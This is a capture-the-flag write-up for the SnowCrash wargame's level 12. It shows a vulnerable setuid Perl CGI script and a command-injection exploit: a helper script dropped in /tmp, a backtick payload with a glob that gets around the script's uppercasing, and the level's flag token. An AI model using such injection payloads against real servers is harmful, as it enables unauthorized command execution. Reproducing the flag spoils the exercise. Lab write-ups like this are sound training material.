# Level12

## Hint

Seems like a bash command is executed in the perl code, perhaps with a bit of tampering you could exploit that.

## Answer

Let's check our current directory:
```
level12@SnowCrash:~$ ll
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout*
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl*
-r-x------  1 level12 level12  675 Apr  3  2012 .profile*
```

Let's first read the contents of the `level12.pl` file:
```perl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Alright seems like there is will be a server on port 4646, also the program will accept two parameters: `x` and `y`. If we read a bit more we notice that a bash command is executed and that our first parameter `x` is executed in that bash command, however the `x` parameter is modified to uppercase and then stripped of its whitespace. So it won't be that easy to exploit it:
```
level12@SnowCrash:~$ curl localhost:4646/?x='`getflag > /tmp/flag`'
.level12@SnowCrash:~$cat /tmp/flag'
cat: /tmp/flag: No such file or directory
```

Indeed the server actually executes \``GETFLAG>/TMP/FLAG`\` instead of what we typed, so it won't execute the command we wanted. However we can just create a file which will execute a bash script:
```
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' > /tmp/EXPLOIT
level12@SnowCrash:~$ chmod +x /tmp/EXPLOIT
```

Then instead of writing the path to that file *(it won't find our file because the path will be turn into uppercase characters)*, we can just use a `*` to match any path:
```
level12@SnowCrash:~$ curl localhost:4646/?x='`/*/EXPLOIT`'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```